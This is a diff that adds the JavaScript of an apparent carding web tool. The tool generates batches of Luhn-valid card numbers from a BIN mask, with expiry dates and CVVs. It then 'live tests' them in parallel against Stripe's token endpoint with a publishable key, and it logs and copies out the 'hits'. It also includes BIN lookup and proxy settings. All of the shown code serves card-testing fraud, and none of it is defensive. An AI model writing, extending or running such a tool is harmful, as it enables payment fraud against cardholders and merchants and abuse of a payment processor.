+    alert('Mask needs at least 12 characters');
+    return;
+  }
+
+  var dateVal=document.getElementById('ccDate').value||'11/27';
+  var randDate=document.getElementById('randomDate').checked;
+  var countryISO=(document.getElementById('ccCountryISO').value||'CA').toUpperCase();
+  var nameVal=document.getElementById('ccName').value||'TEST';
+
+  var resultEl=document.getElementById('batchResult');
+  var outputEl=document.getElementById('batchOutput');
+  var statsEl=document.getElementById('batchStats');
+
+  resultEl.style.display='block';
+  outputEl.value='';
+  statsEl.textContent='Generating '+count+'…';
+
+  var lines=[];
+  var guard=0;
+  while(lines.length<count&&guard<count*20){
+    guard++;
+    var num=numberFromMask(mask);
+    if(!num)continue;
+    if(!luhnCheck(num))continue;
+    var d=randDate?randomExp():dateVal;
+    lines.push({
+      number:num,
+      date:d,
+      cvv:cvvFor(num),
+      name:nameVal,
+      country:countryISO
+    });
+  }
+
+  outputEl.value=lines.map(function(c){
+    return 'BIN: '+c.number+' | Date: '+c.date+' | CVV: '+c.cvv+' | Name: '+c.name+' | Country: '+c.country;
+  }).join('\n');
+
+  statsEl.innerHTML='Ready: <span>'+lines.length+'</span> cards · mask <span>'+mask+'</span> · all Luhn valid';
+}
+
+/* ============ PARSE BATCH LINES BACK ============ */
+function parseCards(){
+  var raw=document.getElementById('batchOutput').value;
+  if(!raw.trim())return [];
+  var out=[];
+  raw.split('\n').forEach(function(line){
+    if(!line.trim())return;
+    var m=line.match(/BIN\s*:\s*([0-9]+)\s*\|\s*Date\s*:\s*([0-9\/]+)\s*\|\s*CVV\s*:\s*(\d+)\s*\|\s*Name\s*:\s*([^|]*)\|\s*Country\s*:\s*([A-Za-z]{2})/);
+    if(m){
+      out.push({number:m[1],date:m[2].trim(),cvv:m[3],name:m[4].trim(),country:m[5].toUpperCase()});
+    }
+  });
+  return out;
+}
+
+/* ============ CARD TEST PRIMITIVES ============ */
+function splitExp(date){
+  var parts=String(date).split('/');
+  var mm=parts[0]?parts[0].replace(/\D/g,''):'';
+  var yy=parts[1]?parts[1].replace(/\D/g,''):'';
+  if(mm.length===1)mm='0'+mm;
+  if(yy.length===2)yy='20'+yy;
+  return{month:mm,year:yy};
+}
+
+async function stripeTokenTest(card,key){
+  var exp=splitExp(card.date);
+  if(!exp.month||!exp.year){return{hit:false,msg:'bad date'}};
+  var body='card[number]='+encodeURIComponent(card.number)
+    +'&card[cvc]='+encodeURIComponent(card.cvv)
+    +'&card[exp_month]='+encodeURIComponent(exp.month)
+    +'&card[exp_year]='+encodeURIComponent(exp.year);
+  try{
+    var r=await fetch('https://api.stripe.com/v1/tokens',{
+      method:'POST',
+      headers:{
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Authorization=[redacted]+key
+      },
+      body:body
+    });
+    var j=await r.json();
+    var res;
+    if(j&&j.error){
+      res={hit:false,msg:(j.error.code||j.error.type||'error')+' - '+(j.error.message||'')};
+    } else if(j&&j.card){
+      res={hit:true,msg:'token ok · '+(j.card.brand||'')+' · '+(j.card.funding||'')+' · '+(j.card.country||'')};
+    } else {
+      res={hit:false,msg:'unexpected response' + ' (HTTP '+r.status+')'};
+    }
+    logStripe(card,res);
+    return res;
+  }catch(e){
+    var res={hit:false,msg:'net error: '+e.message};
+    logStripe(card,res);
+    return res;
+  }
+}function binTest(card){
+  if(!luhnCheck(card.number))return{hit:false,msg:'luhn fail'};
+  var local=localLookup(card.number);
+  var brand=detectBrand(card.number);
+  if(local){
+    return{hit:true,msg:'luhn ok · '+local.bank+' · '+local.country+' · '+local.type};
+  }
+  return{hit:false,msg:'luhn ok · '+brand.name+' · bin unknown locally'};
+}
+
+/* ============ LIVE BATCH TEST ============ */
+var running=false;
+
+async function testBatch(){
+  var btn=document.getElementById('testBatchBtn');
+
+  if(running){
+    running=false;
+    btn.textContent='Stopping…';
+    return;
+  }
+
+  var cards=parseCards();
+  if(!cards.length){
+    alert('Generate a batch first');
+    return;
+  }
+
+  var mode=document.getElementById('testMode').value;
+  var key=document.getElementById('stripeKey').value.trim();
+  if(mode==='stripe'&&!key){
+    alert('Stripe mode needs a pk_ publishable key in the field below');
+    return;
+  }
+
+  var workers=parseInt(document.getElementById('batchConcurrency').value,10)||5;
+  if(workers<1)workers=1;
+  if(workers>20)workers=20;
+
+  var liveBox=document.getElementById('liveBox');
+  var liveEl=document.getElementById('liveResult');
+  var liveStats=document.getElementById('liveStats');
+
+  liveBox.style.display='block';
+  liveEl.value='';
+  liveStats.innerHTML='Testing 0 / '+cards.length+' …';
+
+  running=true;
+  btn.textContent='Stop Test';
+
+  var results=new Array(cards.length);
+  var cursor=0;
+  var flushIdx=0;
+  var hits=0;
+
+  function flush(){
+    while(flushIdx<cards.length&&results[flushIdx]!==undefined){
+      var r=results[flushIdx];
+      if(r.hit){
+        liveEl.value+=r.line+'\n';
+        liveEl.scrollTop=liveEl.scrollHeight;
+        hits++;
+      }
+      flushIdx++;
+    }
+    liveStats.innerHTML='Tested <span>'+flushIdx+'</span> / '+cards.length+' · Hits <span>'+hits+'</span>';
+  }
+
+  async function worker(){
+    while(running){
+      var i=cursor++;
+      if(i>=cards.length)return;
+      var c=cards[i];
+      var res;
+      try{
+        if(mode==='stripe'){
+          res=await stripeTokenTest(c,key);
+        }else{
+          res=binTest(c);
+        }
+      }catch(e){
+        res={hit:false,msg:'net error: '+e.message};
+      }
+      results[i]={
+        hit:!!res.hit,
+        line:(i+1)+'. '+c.number+' | '+c.date+' | '+c.cvv+' | '+c.country+' | '+res.msg
+      };
+      flush();
+      await new Promise(function(r){setTimeout(r,mode==='stripe'?120:10);});
+    }
+  }
+
+  var pool=[];
+  for(var w=0;w<workers;w++)pool.push(worker());
+  await Promise.all(pool);
+
+  running=false;
+  btn.textContent='Test Generated';
+  if(flushIdx<cards.length){
+    liveStats.innerHTML+=' · stopped at <span>'+flushIdx+'</span>';
+  }else{
+    liveStats.innerHTML='Done · tested <span>'+cards.length+'</span> · hits <span>'+hits+'</span>';
+  }
+}
+
+/* ============ COPY ============ */
+function copyToClipboard(text){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).catch(function(){fallbackCopy(text);});
+  }else{
+    fallbackCopy(text);
+  }
+}
+function fallbackCopy(text){
+  var ta=document.createElement('textarea');
+  ta.value=text;
+  ta.style.position='fixed';
+  ta.style.left='-9999px';
+  document.body.appendChild(ta);
+  ta.select();
+  try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+
+function copyBatchValid(){
+  var v=document.getElementById('batchOutput').value;
+  if(!v)return;
+  copyToClipboard(v);
+}
+
+function copyLiveValid(){
+  var v=document.getElementById('liveResult').value;
+  if(!v)return;
+  copyToClipboard(v);
+}
+
+function copyCard(){
+  var d=window._lastCardData;
+  if(!d)return;
+  var lines=[
+    'Card: '+formatCardNumber(d.number),
+    'Expiry: '+(d.exp||'-'),
+    'CVV: '+(d.cvc||'-'),
+    'Name: '+(d.name||'-'),
+    'Brand: '+d.brand,
+    'Luhn: '+(d.luhn?'Valid':'Invalid'),
+    'Bank: '+d.bank,
+    'Country: '+d.countryName+' ('+d.country+')',
+    'Currency: '+d.currency,
+    'Type: '+d.type,
+    'Prepaid: '+(d.prepaid?'Yes':'No'),
+    'Address: '+(d.addr||'-'),
+    'City: '+(d.city||'-'),
+    'State: '+(d.state||'-'),
+    'ZIP: '+(d.zip||'-'),
+    'Billing Country: '+(d.billingCountry||'-')
+  ];
+  copyToClipboard(lines.join('\n'));
+}
+
+function copyAll(){
+  copyCard();
+  flash(document.getElementById('copyAllBtn'),'Copied');
+}
+
+/* ============ LIVE LOG ============ */
+var logBuffer=[];
+
+function appendLog(msg){
+  var now=new Date();
+  var hh=('0'+now.getHours()).slice(-2);
+  var mm=('0'+now.getMinutes()).slice(-2);
+  var ss=('0'+now.getSeconds()).slice(-2);
+  var line='['+hh+':'+mm+':'+ss+'] '+msg+'\n';
+  logBuffer.push(line);
+  var el=document.getElementById('liveLog');
+  if(el){
+    el.value+=line;
+    el.scrollTop=el.scrollHeight;
+  }
+}
+
+function logBin(card,res){
+  var bin=String(card.number||'').slice(0,8);
+  appendLog('BIN ' + bin + ' | ' + card.date + ' | CVV ' + card.cvv + ' | ' + card.country + ' -> ' + (res.hit ? 'HIT' : 'MISS') + ' | ' + res.msg);
+}
+
+function logStripe(card,res){
+  var bin=String(card.number||'').slice(0,8);
+  appendLog('STRIPE ' + bin + ' | ' + card.date + ' | CVV ' + card.cvv + ' | ' + card.country + ' -> ' + (res.hit ? 'HIT' : 'MISS') + ' | ' + res.msg);
+}
+
+function clearLog(){var el=document.getElementById('liveLog');if(el){el.value='';logBuffer=[];}}
+
+function toggleLog(){var el=document.getElementById('logPanel');if(!el)return;var show=el.style.display!=='block';el.style.display=show?'block':'none';var btn=document.getElementById('logToggleBtn');if(btn)btn.textContent=show?'Hide Live Log':'Show Live Log';}
+
+
+/* ============ RENDER ============ */
+function item(label,value){
+  return '<div class="info-item"><div class="info-label">'+label+'</div><div class="info-value">'+value+'</div></div>';
+}
+
+function renderCard(data){
+  var el=document.getElementById('result');
+  var brand=detectBrand(data.number||data.bin);
+  var luhn=luhnCheck(String(data.number||''));
+  var html='<div class="card-top"><div class="card-title">Card Details <span class="badge '+brand.short+'">'+brand.name+'</span></div>'
+    +'<button class="copy-btn" onclick="copyCard()">Copy Card</button></div>';
+  html+='<div class="luhn '+(luhn?'ok':'fail')+'">'+(luhn?'Luhn Valid':'Luhn Invalid')+'</div>';
+  html+='<div class="info-grid">';
+  html+=item('Card Number',formatCardNumber(data.number||''));
+  html+=item('Expiry',document.getElementById('ccExp').value||'-');
+  html+=item('CVV',document.getElementById('ccCvc').value||'-');
+  html+=item('Name',document.getElementById('ccName').value||'-');
+  html+=item('Brand',brand.name);
+  html+=item('Type',data.type||'N/A');
+  html+=item('Bank',data.bank||'N/A');
+  html+=item('Country',(data.countryName||data.country||'N/A')+' ('+(data.country||'??')+')');
+  html+=item('Currency',data.currency||'N/A');
+  html+=item('Prepaid',data.prepaid?'Yes':'No');
+  html+=item('Address',document.getElementById('ccAddr').value||'-');
+  html+=item('City',document.getElementById('ccCity').value||'-');
+  html+=item('State',document.getElementById('ccState').value||'-');
+  html+=item('ZIP',document.getElementById('ccZip').value||'-');
+  html+=item('Billing Country',document.getElementById('ccCountry').value||'-');
+  html+='</div>';
+  el.innerHTML=html;
+  el.classList.add('show');
+  document.getElementById('copyAllBtn').style.display='block';
+  window._lastCardData={
+    number:String(data.number||''),
+    brand:brand.name,
+    luhn:luhn,
+    bank:data.bank||'N/A',
+    country:data.country||'N/A',
+    countryName:data.countryName||'N/A',
+    currency:data.currency||'N/A',
+    type:data.type||'N/A',
+    prepaid:!!data.prepaid,
+    exp:document.getElementById('ccExp').value,
+    cvc:document.getElementById('ccCvc').value,
+    name:document.getElementById('ccName').value,
+    addr:document.getElementById('ccAddr').value,
+    city:document.getElementById('ccCity').value,
+    state:document.getElementById('ccState').value,
+    zip:document.getElementById('ccZip').value,
+    billingCountry:document.getElementById('ccCountry').value
+  };
+}
+
+/* ============ MAIN CHECK ============ */
+async function doCheck(){
+  var raw=document.getElementById('ccNum').value;
+  var num=String(raw).replace(/\D/g,'');
+  var el=document.getElementById('result');
+
+  if(num.length<6){
+    el.innerHTML='<p style="color:#ff3c3c;text-align:center;padding:10px">Enter at least 6 digits</p>';
+    el.classList.add('show');
+    return;
+  }
+
+  var bin=num.slice(0,8);
+  el.innerHTML='<p style="text-align:center;padding:10px;color:#00d4ff">Looking up BIN '+bin+'… <span class="spinner"></span></p>';
+  el.classList.add('show');
+
+  var local=localLookup(bin);
+  if(local){
+    renderCard(Object.assign({},local,{bin:bin,number:num}));
+    return;
+  }
+
+  var api=await apiLookup(bin);
+  if(api){
+    renderCard(Object.assign({},api,{bin:bin,number:num}));
+    return;
+  }
+
+  var b=detectBrand(bin);
+  renderCard({bin:bin,number:num,brand:b.name,country:'??',countryName:'Unknown',bank:'N/A',currency:'N/A',type:'N/A',prepaid:false});
+}
+
+/* ============ STRIPE SINGLE TEST ============ */
+async function testStripe(){
+  var key=document.getElementById('stripeKey').value.trim();
+  var num=document.getElementById('ccNum').value.replace(/\D/g,'');
+  var exp=document.getElementById('ccExp').value;
+  var cvv=document.getElementById('ccCvc').value;
+
+  if(!key){alert('Enter your Stripe publishable key');return;}
+  if(num.length<12){alert('Card number too short');return;}
+
+  var btn=document.getElementById('stripeBtn');
+  var orig=btn.textContent;
+  btn.disabled=true;
+  btn.textContent='Testing…';
+
+  var el=document.getElementById('result');
+  try{
+    var res=await stripeTokenTest({number:num,date:exp,cvv:cvv},key);
+    var html='<div class="api-test '+(res.hit?'success':'error')+'"><h4>Stripe Token Result</h4><pre>'+res.msg+'</pre></div>';
+    el.innerHTML+=html;
+  }catch(e){
+    el.innerHTML+='<div class="api-test error"><h4>Stripe Test Error</h4><pre>'+e.message+'</pre></div>';
+  }finally{
+    btn.disabled=false;
+    btn.textContent=orig;
+  }
+}
+
+/* ============ MASK-AWARE INPUT ============ */
+function showStripeHelp(){
+  var el=document.getElementById('stripeHelp');
+  el.style.display=el.style.display==='none'?'block':'none';
+}
+
+function onInput(val){
+  var el=document.getElementById('ccNum');
+  var clean=String(val).replace(/[^0-9xX]/g,'').toLowerCase();
+  var formatted=formatCardNumber(clean);
+  el.value=formatted;
+  try{el.setSelectionRange(formatted.length,formatted.length);}catch(e){}
+}
+
+function syncProxy(){
+  var preset=document.getElementById('proxyPreset').value;
+  document.getElementById('proxyUrl').value=preset;
+}
+
+/* ============ BOOT ============ */
+document.getElementById('ccNum').addEventListener('keydown',function(e){
+  if(e.key==='Enter')doCheck();
+});
+document.getElementById('proxyUrl').value=document.getElementById('proxyPreset').value;
+</script>
+</body>
+</html>
